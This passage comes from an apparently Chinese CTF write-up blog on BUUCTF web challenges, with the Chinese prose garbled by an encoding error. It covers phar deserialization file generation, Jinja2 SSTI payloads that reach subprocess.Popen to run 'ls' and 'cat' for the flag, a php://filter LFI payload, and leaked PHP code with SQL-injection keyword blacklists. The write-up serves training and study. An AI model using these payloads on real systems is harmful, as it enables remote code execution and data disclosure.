class="hljs-variable">$b</span>;<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&#x27;test.phar&#x27;</span>);   <span class="hljs-comment">//ç”Ÿæˆæ–‡ä»¶å</span><br>    <span class="hljs-variable">$phar</span>-&gt;startBuffering();<br>    <span class="hljs-variable">$phar</span>-&gt;addFromString(<span class="hljs-string">&#x27;test.txt&#x27;</span>, <span class="hljs-string">&#x27;text&#x27;</span>);<br>    <span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);     <span class="hljs-comment">//æ ‡å¿—ä½å­˜åœ¨åˆ™å¯è¢«è¯†åˆ«ä¸ºpharæ–‡ä»¶</span><br>    <span class="hljs-variable">$phar</span>-&gt;setMetadata(<span class="hljs-variable">$c</span>); <span class="hljs-comment">////å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;stopBuffering();<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç„¶åå°†ç”Ÿæˆçš„ test.phar æ›´åä¸º test.gif ä¸Šä¼ æ–‡ä»¶ï¼Œç„¶åæŠ“åˆ é™¤çš„åŒ…ï¼Œæ›´æ”¹å¦‚ä¸‹</p><p> <img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201221812934.png" alt="image-20220122181224818"></p><h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p>é¦–é¡µæºç ç»™å‡ºæç¤º</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- Parameter Name: search --&gt;</span><br><span class="hljs-comment">&lt;!-- Method: GET --&gt;</span><br></code></pre></td></tr></table></figure><p>äºæ˜¯å¯ä»¥æ„é€  <code>http://5984b711-4129-4988-9e93-f581a5b1a85b.node4.buuoj.cn:81/?search=&#123;&#123;7*'7'&#125;&#125;</code></p><p>å›æ˜¾ 7777777 ï¼Œåˆæ­¥åˆ¤æ–­æ˜¯Jinja2å¼•æ“</p><p>è‰ï¼Œè¿™é¢˜æœ‰è¿‡æ»¤ï¼Ÿå¥½åƒæ²¡æœ‰  <code>?search=&#123;&#123;''.__class__.__mro__[2].__subclasses__()&#125;&#125;</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201221820601.png" alt="image-20220122182000480"></p><p>å‘ç°popen</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">str</span>=<span class="hljs-string">&quot;&lt;type &#x27;type&#x27;&gt;,&lt;type &#x27;weakref&#x27;&gt;,&lt;type &#x27;weakcallableproxy&#x27;&gt;,&lt;type &#x27;weakproxy&#x27;&gt;,&lt;type &#x27;int&#x27;&gt;,&lt;type &#x27;basestring&#x27;&gt;,&lt;type &#x27;bytearray&#x27;&gt;,&lt;type &#x27;list&#x27;&gt;,&lt;type &#x27;NoneType&#x27;&gt;,&lt;type &#x27;NotImplementedType&#x27;&gt;,&lt;type &#x27;traceback&#x27;&gt;,&lt;type &#x27;super&#x27;&gt;,&lt;type &#x27;xrange&#x27;&gt;,&lt;type &#x27;dict&#x27;&gt;,&lt;type &#x27;set&#x27;&gt;,&lt;type &#x27;slice&#x27;&gt;,&lt;type &#x27;staticmethod&#x27;&gt;,&lt;type &#x27;complex&#x27;&gt;,&lt;type &#x27;float&#x27;&gt;,&lt;type &#x27;buffer&#x27;&gt;,&lt;type &#x27;long&#x27;&gt;,&lt;type &#x27;frozenset&#x27;&gt;,&lt;type &#x27;property&#x27;&gt;,&lt;type &#x27;memoryview&#x27;&gt;,&lt;type &#x27;tuple&#x27;&gt;,&lt;type &#x27;enumerate&#x27;&gt;,&lt;type &#x27;reversed&#x27;&gt;,&lt;type &#x27;code&#x27;&gt;,&lt;type &#x27;frame&#x27;&gt;,&lt;type &#x27;builtin_function_or_method&#x27;&gt;,&lt;type &#x27;instancemethod&#x27;&gt;,&lt;type &#x27;function&#x27;&gt;,&lt;type &#x27;classobj&#x27;&gt;,&lt;type &#x27;dictproxy&#x27;&gt;,&lt;type &#x27;generator&#x27;&gt;,&lt;type &#x27;getset_descriptor&#x27;&gt;,&lt;type &#x27;wrapper_descriptor&#x27;&gt;,&lt;type &#x27;instance&#x27;&gt;,&lt;type &#x27;ellipsis&#x27;&gt;,&lt;type &#x27;member_descriptor&#x27;&gt;,&lt;type &#x27;file&#x27;&gt;,&lt;type &#x27;PyCapsule&#x27;&gt;,&lt;type &#x27;cell&#x27;&gt;,&lt;type &#x27;callable-iterator&#x27;&gt;,&lt;type &#x27;iterator&#x27;&gt;,&lt;type &#x27;sys.long_info&#x27;&gt;,&lt;type &#x27;sys.float_info&#x27;&gt;,&lt;type &#x27;EncodingMap&#x27;&gt;,&lt;type &#x27;fieldnameiterator&#x27;&gt;,&lt;type &#x27;formatteriterator&#x27;&gt;,&lt;type &#x27;sys.version_info&#x27;&gt;,&lt;type &#x27;sys.flags&#x27;&gt;,&lt;type &#x27;exceptions.BaseException&#x27;&gt;,&lt;type &#x27;module&#x27;&gt;,&lt;type &#x27;imp.NullImporter&#x27;&gt;,&lt;type &#x27;zipimport.zipimporter&#x27;&gt;,&lt;type &#x27;posix.stat_result&#x27;&gt;,&lt;type &#x27;posix.statvfs_result&#x27;&gt;,&lt;class &#x27;warnings.WarningMessage&#x27;&gt;,&lt;class &#x27;warnings.catch_warnings&#x27;&gt;,&lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;,&lt;class &#x27;_weakrefset.WeakSet&#x27;&gt;,&lt;class &#x27;_abcoll.Hashable&#x27;&gt;,&lt;type &#x27;classmethod&#x27;&gt;,&lt;class &#x27;_abcoll.Iterable&#x27;&gt;,&lt;class &#x27;_abcoll.Sized&#x27;&gt;,&lt;class &#x27;_abcoll.Container&#x27;&gt;,&lt;class &#x27;_abcoll.Callable&#x27;&gt;,&lt;type &#x27;dict_keys&#x27;&gt;,&lt;type &#x27;dict_items&#x27;&gt;,&lt;type &#x27;dict_values&#x27;&gt;,&lt;class &#x27;site._Printer&#x27;&gt;,&lt;class &#x27;site._Helper&#x27;&gt;,&lt;type &#x27;_sre.SRE_Pattern&#x27;&gt;,&lt;type &#x27;_sre.SRE_Match&#x27;&gt;,&lt;type &#x27;_sre.SRE_Scanner&#x27;&gt;,&lt;class &#x27;site.Quitter&#x27;&gt;,&lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;,&lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;,&lt;class &#x27;string.Template&#x27;&gt;,&lt;class &#x27;string.Formatter&#x27;&gt;,&lt;type &#x27;collections.deque&#x27;&gt;,&lt;type &#x27;deque_iterator&#x27;&gt;,&lt;type &#x27;deque_reverse_iterator&#x27;&gt;,&lt;type &#x27;operator.itemgetter&#x27;&gt;,&lt;type &#x27;operator.attrgetter&#x27;&gt;,&lt;type &#x27;operator.methodcaller&#x27;&gt;,&lt;type &#x27;itertools.combinations&#x27;&gt;,&lt;type &#x27;itertools.combinations_with_replacement&#x27;&gt;,&lt;type &#x27;itertools.cycle&#x27;&gt;,&lt;type &#x27;itertools.dropwhile&#x27;&gt;,&lt;type &#x27;itertools.takewhile&#x27;&gt;,&lt;type &#x27;itertools.islice&#x27;&gt;,&lt;type &#x27;itertools.starmap&#x27;&gt;,&lt;type &#x27;itertools.imap&#x27;&gt;,&lt;type &#x27;itertools.chain&#x27;&gt;,&lt;type &#x27;itertools.compress&#x27;&gt;,&lt;type &#x27;itertools.ifilter&#x27;&gt;,&lt;type &#x27;itertools.ifilterfalse&#x27;&gt;,&lt;type &#x27;itertools.count&#x27;&gt;,&lt;type &#x27;itertools.izip&#x27;&gt;,&lt;type &#x27;itertools.izip_longest&#x27;&gt;,&lt;type &#x27;itertools.permutations&#x27;&gt;,&lt;type &#x27;itertools.product&#x27;&gt;,&lt;type &#x27;itertools.repeat&#x27;&gt;,&lt;type &#x27;itertools.groupby&#x27;&gt;,&lt;type &#x27;itertools.tee_dataobject&#x27;&gt;,&lt;type &#x27;itertools.tee&#x27;&gt;,&lt;type &#x27;itertools._grouper&#x27;&gt;,&lt;type &#x27;_thread._localdummy&#x27;&gt;,&lt;type &#x27;thread._local&#x27;&gt;,&lt;type &#x27;thread.lock&#x27;&gt;,&lt;type &#x27;method_descriptor&#x27;&gt;,&lt;class &#x27;markupsafe._MarkupEscapeHelper&#x27;&gt;,&lt;type &#x27;_io._IOBase&#x27;&gt;,&lt;type &#x27;_io.IncrementalNewlineDecoder&#x27;&gt;,&lt;type &#x27;_hashlib.HASH&#x27;&gt;,&lt;type &#x27;_random.Random&#x27;&gt;,&lt;type &#x27;cStringIO.StringO&#x27;&gt;,&lt;type &#x27;cStringIO.StringI&#x27;&gt;,&lt;type &#x27;cPickle.Unpickler&#x27;&gt;,&lt;type &#x27;cPickle.Pickler&#x27;&gt;,&lt;type &#x27;functools.partial&#x27;&gt;,&lt;type &#x27;_ssl._SSLContext&#x27;&gt;,&lt;type &#x27;_ssl._SSLSocket&#x27;&gt;,&lt;class &#x27;socket._closedsocket&#x27;&gt;,&lt;type &#x27;_socket.socket&#x27;&gt;,&lt;class &#x27;socket._socketobject&#x27;&gt;,&lt;class &#x27;socket._fileobject&#x27;&gt;,&lt;type &#x27;time.struct_time&#x27;&gt;,&lt;type &#x27;Struct&#x27;&gt;,&lt;class &#x27;urlparse.ResultMixin&#x27;&gt;,&lt;class &#x27;contextlib.GeneratorContextManager&#x27;&gt;,&lt;class &#x27;contextlib.closing&#x27;&gt;,&lt;type &#x27;_json.Scanner&#x27;&gt;,&lt;type &#x27;_json.Encoder&#x27;&gt;,&lt;class &#x27;json.decoder.JSONDecoder&#x27;&gt;,&lt;class &#x27;json.encoder.JSONEncoder&#x27;&gt;,&lt;class &#x27;threading._Verbose&#x27;&gt;,&lt;class &#x27;jinja2.utils.MissingType&#x27;&gt;,&lt;class &#x27;jinja2.utils.LRUCache&#x27;&gt;,&lt;class &#x27;jinja2.utils.Cycler&#x27;&gt;,&lt;class &#x27;jinja2.utils.Joiner&#x27;&gt;,&lt;class &#x27;jinja2.utils.Namespace&#x27;&gt;,&lt;class &#x27;jinja2.bccache.Bucket&#x27;&gt;,&lt;class &#x27;jinja2.bccache.BytecodeCache&#x27;&gt;,&lt;class &#x27;jinja2.nodes.EvalContext&#x27;&gt;,&lt;class &#x27;jinja2.visitor.NodeVisitor&#x27;&gt;,&lt;class &#x27;jinja2.nodes.Node&#x27;&gt;,&lt;class &#x27;jinja2.idtracking.Symbols&#x27;&gt;,&lt;class &#x27;jinja2.compiler.MacroRef&#x27;&gt;,&lt;class &#x27;jinja2.compiler.Frame&#x27;&gt;,&lt;class &#x27;jinja2.runtime.TemplateReference&#x27;&gt;,&lt;class &#x27;numbers.Number&#x27;&gt;,&lt;class &#x27;jinja2.runtime.Context&#x27;&gt;,&lt;class &#x27;jinja2.runtime.BlockReference&#x27;&gt;,&lt;class &#x27;jinja2.runtime.Macro&#x27;&gt;,&lt;class &#x27;jinja2.runtime.Undefined&#x27;&gt;,&lt;class &#x27;decimal.Decimal&#x27;&gt;,&lt;class &#x27;decimal._ContextManager&#x27;&gt;,&lt;class &#x27;decimal.Context&#x27;&gt;,&lt;class &#x27;decimal._WorkRep&#x27;&gt;,&lt;class &#x27;decimal._Log10Memoize&#x27;&gt;,&lt;type &#x27;_ast.AST&#x27;&gt;,&lt;class &#x27;ast.NodeVisitor&#x27;&gt;,&lt;class &#x27;jinja2.lexer.Failure&#x27;&gt;,&lt;class &#x27;jinja2.lexer.TokenStreamIterator&#x27;&gt;,&lt;class &#x27;jinja2.lexer.TokenStream&#x27;&gt;,&lt;class &#x27;jinja2.lexer.Lexer&#x27;&gt;,&lt;class &#x27;jinja2.parser.Parser&#x27;&gt;,&lt;class &#x27;jinja2.environment.Environment&#x27;&gt;,&lt;class &#x27;jinja2.environment.Template&#x27;&gt;,&lt;class &#x27;jinja2.environment.TemplateModule&#x27;&gt;,&lt;class &#x27;jinja2.environment.TemplateExpression&#x27;&gt;,&lt;class &#x27;jinja2.environment.TemplateStream&#x27;&gt;,&lt;class &#x27;jinja2.loaders.BaseLoader&#x27;&gt;,&lt;type &#x27;datetime.date&#x27;&gt;,&lt;type &#x27;datetime.timedelta&#x27;&gt;,&lt;type &#x27;datetime.time&#x27;&gt;,&lt;type &#x27;datetime.tzinfo&#x27;&gt;,&lt;class &#x27;logging.LogRecord&#x27;&gt;,&lt;class &#x27;logging.Formatter&#x27;&gt;,&lt;class &#x27;logging.BufferingFormatter&#x27;&gt;,&lt;class &#x27;logging.Filter&#x27;&gt;,&lt;class &#x27;logging.Filterer&#x27;&gt;,&lt;class &#x27;logging.PlaceHolder&#x27;&gt;,&lt;class &#x27;logging.Manager&#x27;&gt;,&lt;class &#x27;logging.LoggerAdapter&#x27;&gt;,&lt;class &#x27;werkzeug._internal._Missing&#x27;&gt;,&lt;class &#x27;werkzeug._internal._DictAccessorProperty&#x27;&gt;,&lt;class &#x27;werkzeug.utils.HTMLBuilder&#x27;&gt;,&lt;class &#x27;werkzeug.exceptions.Aborter&#x27;&gt;,&lt;class &#x27;werkzeug.urls.Href&#x27;&gt;,&lt;type &#x27;select.epoll&#x27;&gt;,&lt;class &#x27;click._compat._FixupStream&#x27;&gt;,&lt;class &#x27;click._compat._AtomicFile&#x27;&gt;,&lt;class &#x27;click.utils.LazyFile&#x27;&gt;,&lt;class &#x27;click.utils.KeepOpenFile&#x27;&gt;,&lt;class &#x27;click.utils.PacifyFlushWrapper&#x27;&gt;,&lt;class &#x27;click.parser.Option&#x27;&gt;,&lt;class &#x27;click.parser.Argument&#x27;&gt;,&lt;class &#x27;click.parser.ParsingState&#x27;&gt;,&lt;class &#x27;click.parser.OptionParser&#x27;&gt;,&lt;class &#x27;click.types.ParamType&#x27;&gt;,&lt;class &#x27;click.formatting.HelpFormatter&#x27;&gt;,&lt;class &#x27;click.core.Context&#x27;&gt;,&lt;class &#x27;click.core.BaseCommand&#x27;&gt;,&lt;class &#x27;click.core.Parameter&#x27;&gt;,&lt;class &#x27;werkzeug.serving.WSGIRequestHandler&#x27;&gt;,&lt;class &#x27;werkzeug.serving._SSLContext&#x27;&gt;,&lt;class &#x27;werkzeug.serving.BaseWSGIServer&#x27;&gt;,&lt;class &#x27;werkzeug.datastructures.ImmutableListMixin&#x27;&gt;,&lt;class &#x27;werkzeug.datastructures.ImmutableDictMixin&#x27;&gt;,&lt;class &#x27;werkzeug.datastructures.UpdateDictMixin&#x27;&gt;,&lt;class &#x27;werkzeug.datastructures.ViewItems&#x27;&gt;,&lt;class &#x27;werkzeug.datastructures._omd_bucket&#x27;&gt;,&lt;class &#x27;werkzeug.datastructures.Headers&#x27;&gt;,&lt;class &#x27;werkzeug.datastructures.ImmutableHeadersMixin&#x27;&gt;,&lt;class &#x27;werkzeug.datastructures.IfRange&#x27;&gt;,&lt;class &#x27;werkzeug.datastructures.Range&#x27;&gt;,&lt;class &#x27;werkzeug.datastructures.ContentRange&#x27;&gt;,&lt;class &#x27;werkzeug.datastructures.FileStorage&#x27;&gt;,&lt;class &#x27;email.LazyImporter&#x27;&gt;,&lt;class &#x27;calendar.Calendar&#x27;&gt;,&lt;class &#x27;werkzeug.wrappers.accept.AcceptMixin&#x27;&gt;,&lt;class &#x27;werkzeug.wrappers.auth.AuthorizationMixin&#x27;&gt;,&lt;class &#x27;werkzeug.wrappers.auth.WWWAuthenticateMixin&#x27;&gt;,&lt;class &#x27;werkzeug.wsgi.ClosingIterator&#x27;&gt;,&lt;class &#x27;werkzeug.wsgi.FileWrapper&#x27;&gt;,&lt;class &#x27;werkzeug.wsgi._RangeWrapper&#x27;&gt;,&lt;class &#x27;werkzeug.formparser.FormDataParser&#x27;&gt;,&lt;class &#x27;werkzeug.formparser.MultiPartParser&#x27;&gt;,&lt;class &#x27;werkzeug.wrappers.base_request.BaseRequest&#x27;&gt;,&lt;class &#x27;werkzeug.wrappers.base_response.BaseResponse&#x27;&gt;,&lt;class &#x27;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&#x27;&gt;,&lt;class &#x27;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&#x27;&gt;,&lt;class &#x27;werkzeug.wrappers.etag.ETagRequestMixin&#x27;&gt;,&lt;class &#x27;werkzeug.wrappers.etag.ETagResponseMixin&#x27;&gt;,&lt;class &#x27;werkzeug.wrappers.cors.CORSRequestMixin&#x27;&gt;,&lt;class &#x27;werkzeug.wrappers.cors.CORSResponseMixin&#x27;&gt;,&lt;class &#x27;werkzeug.useragents.UserAgentParser&#x27;&gt;,&lt;class &#x27;werkzeug.useragents.UserAgent&#x27;&gt;,&lt;class &#x27;werkzeug.wrappers.user_agent.UserAgentMixin&#x27;&gt;,&lt;class &#x27;werkzeug.wrappers.request.StreamOnlyMixin&#x27;&gt;,&lt;class &#x27;werkzeug.wrappers.response.ResponseStream&#x27;&gt;,&lt;class &#x27;werkzeug.wrappers.response.ResponseStreamMixin&#x27;&gt;,&lt;class &#x27;werkzeug.test._TestCookieHeaders&#x27;&gt;,&lt;class &#x27;werkzeug.test._TestCookieResponse&#x27;&gt;,&lt;class &#x27;werkzeug.test.EnvironBuilder&#x27;&gt;,&lt;class &#x27;werkzeug.test.Client&#x27;&gt;,&lt;class &#x27;uuid.UUID&#x27;&gt;,&lt;type &#x27;CArgObject&#x27;&gt;,&lt;type &#x27;_ctypes.CThunkObject&#x27;&gt;,&lt;type &#x27;_ctypes._CData&#x27;&gt;,&lt;type &#x27;_ctypes.CField&#x27;&gt;,&lt;type &#x27;_ctypes.DictRemover&#x27;&gt;,&lt;class &#x27;ctypes.CDLL&#x27;&gt;,&lt;class &#x27;ctypes.LibraryLoader&#x27;&gt;,&lt;class &#x27;subprocess.Popen&#x27;&gt;,&lt;class &#x27;itsdangerous._json._CompactJSON&#x27;&gt;,&lt;class &#x27;itsdangerous.signer.SigningAlgorithm&#x27;&gt;,&lt;class &#x27;itsdangerous.signer.Signer&#x27;&gt;,&lt;class &#x27;itsdangerous.serializer.Serializer&#x27;&gt;,&lt;class &#x27;itsdangerous.url_safe.URLSafeSerializerMixin&#x27;&gt;,&lt;class &#x27;flask._compat._DeprecatedBool&#x27;&gt;,&lt;class &#x27;werkzeug.local.Local&#x27;&gt;,&lt;class &#x27;werkzeug.local.LocalStack&#x27;&gt;,&lt;class &#x27;werkzeug.local.LocalManager&#x27;&gt;,&lt;class &#x27;werkzeug.local.LocalProxy&#x27;&gt;,&lt;class &#x27;difflib.HtmlDiff&#x27;&gt;,&lt;class &#x27;werkzeug.routing.RuleFactory&#x27;&gt;,&lt;class &#x27;werkzeug.routing.RuleTemplate&#x27;&gt;,&lt;class &#x27;werkzeug.routing.BaseConverter&#x27;&gt;,&lt;class &#x27;werkzeug.routing.Map&#x27;&gt;,&lt;class &#x27;werkzeug.routing.MapAdapter&#x27;&gt;,&lt;class &#x27;flask.signals.Namespace&#x27;&gt;,&lt;class &#x27;flask.signals._FakeSignal&#x27;&gt;,&lt;class &#x27;flask.helpers.locked_cached_property&#x27;&gt;,&lt;class &#x27;flask.helpers._PackageBoundObject&#x27;&gt;,&lt;class &#x27;flask.cli.DispatchingApp&#x27;&gt;,&lt;class &#x27;flask.cli.ScriptInfo&#x27;&gt;,&lt;class &#x27;flask.config.ConfigAttribute&#x27;&gt;,&lt;class &#x27;flask.ctx._AppCtxGlobals&#x27;&gt;,&lt;class &#x27;flask.ctx.AppContext&#x27;&gt;,&lt;class &#x27;flask.ctx.RequestContext&#x27;&gt;,&lt;class &#x27;flask.json.tag.JSONTag&#x27;&gt;,&lt;class &#x27;flask.json.tag.TaggedJSONSerializer&#x27;&gt;,&lt;class &#x27;flask.sessions.SessionInterface&#x27;&gt;,&lt;class &#x27;werkzeug.wrappers.json._JSONModule&#x27;&gt;,&lt;class &#x27;werkzeug.wrappers.json.JSONMixin&#x27;&gt;,&lt;class &#x27;flask.blueprints.BlueprintSetupState&#x27;&gt;,&lt;type &#x27;unicodedata.UCD&#x27;&gt;,&lt;class &#x27;jinja2.ext.Extension&#x27;&gt;,&lt;class &#x27;jinja2.ext._CommentFinder&#x27;&gt;,&lt;type &#x27;array.array&#x27;&gt;,&lt;type &#x27;method-wrapper&#x27;&gt;&quot;</span><br><span class="hljs-built_in">str</span>=<span class="hljs-built_in">str</span>.split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>count=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&lt;type&quot;</span> <span class="hljs-keyword">in</span> i <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&lt;class&quot;</span> <span class="hljs-keyword">in</span> i:<br>        count+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;subprocess&quot;</span> <span class="hljs-keyword">in</span>  i:<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(count-<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>è‡ªå·±å†™äº†ä¸ªè„šæœ¬ç”¨è¿™ä¸ªæ¥è®¡æ•°</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201221921765.png" alt="image-20220122192128669"></p><p>æœ€åæœ‰</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span>[2].__subclasses__()[258](<span class="hljs-name">&#x27;ls /&#x27;</span>,<span class="hljs-attr">shell</span>=<span class="hljs-literal">True</span>,<span class="hljs-attr">stdout</span>=-1).communicate()[0].strip()&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><br><span class="xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span>[2].__subclasses__()[258](<span class="hljs-name">&#x27;ls /flasklight&#x27;</span>,<span class="hljs-attr">shell</span>=<span class="hljs-literal">True</span>,<span class="hljs-attr">stdout</span>=-1).communicate()[0].strip()&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><br><span class="xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span>[2].__subclasses__()[258](<span class="hljs-name">&#x27;cat /flasklight/coomme_geeeett_youur_flek&#x27;</span>,<span class="hljs-attr">shell</span>=<span class="hljs-literal">True</span>,<span class="hljs-attr">stdout</span>=-1).communicate()[0].strip()&#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk</h2><p>é¦–é¡µæºç æç¤º</p><p><code> &lt;!--?file=?--&gt;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">index.php?file=php://filter/convert.base64-encode/resource=index.php<br></code></pre></td></tr></table></figure><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, <span class="hljs-string">&#x27;/var/www/html/&#x27;</span>);<br><br><span class="hljs-comment">// $file = $_GET[&quot;file&quot;];</span><br><span class="hljs-variable">$file</span> = (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>] : <span class="hljs-literal">null</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>))&#123;<br>    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;</span>,<span class="hljs-variable">$file</span>)) &#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;no way!&#x27;</span>);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>    @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>seacrch.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;config.php&quot;</span>; <br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;phone&quot;</span>]))<br>&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;<br>    <span class="hljs-variable">$user_name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;user_name&quot;</span>];<br>    <span class="hljs-variable">$phone</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;phone&quot;</span>];<br>    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-variable">$pattern</span>,<span class="hljs-variable">$user_name</span>) || preg_match(<span class="hljs-variable">$pattern</span>,<span class="hljs-variable">$phone</span>))&#123; <br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;no sql inject!&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from `user` where `user_name`=&#x27;<span class="hljs-subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="hljs-subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;<br>        <span class="hljs-variable">$fetch</span> = <span class="hljs-variable">$db</span>-&gt;query(<span class="hljs-variable">$sql</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$fetch</span>) &amp;&amp; <span class="hljs-variable">$fetch</span>-&gt;num_rows&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-variable">$row</span> = <span class="hljs-variable">$fetch</span>-&gt;fetch_assoc();<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$row</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;error&#x27;</span>;<br>            print_r(<span class="hljs-variable">$db</span>-&gt;error);<br>            <span class="hljs-keyword">exit</span>;<br>        &#125;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;&lt;p&gt;å§“å:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;user_name&#x27;</span>].<span class="hljs-string">&quot;&lt;/p&gt;&lt;p&gt;, ç”µè¯:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;phone&#x27;</span>].<span class="hljs-string">&quot;&lt;/p&gt;&lt;p&gt;, åœ°å€:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;address&#x27;</span>].<span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;æœªæ‰¾åˆ°è®¢å•!&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span 